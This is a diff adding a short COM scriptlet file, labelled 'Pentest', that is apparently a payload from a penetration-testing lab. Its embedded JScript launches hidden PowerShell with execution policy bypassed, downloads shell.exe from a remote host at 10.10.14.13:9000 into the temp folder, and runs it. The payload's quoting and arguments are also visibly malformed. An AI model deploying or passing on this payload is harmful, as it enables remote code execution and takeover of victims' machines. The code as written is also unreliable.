@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration         
+progid="Pentest"       
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+ 
+<![CDATA[   
+var r = new ActiveXObject("WScript.Shell").Run("Powershell.exe -executionpolicy -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.13:9000/shell.exe',\"$env:temp\shell.exe\"); Start-Process \"$env:temp\shell.exe\"""); 
+]]>
+ 
+</script>
+</registration>
+</scriptlet>
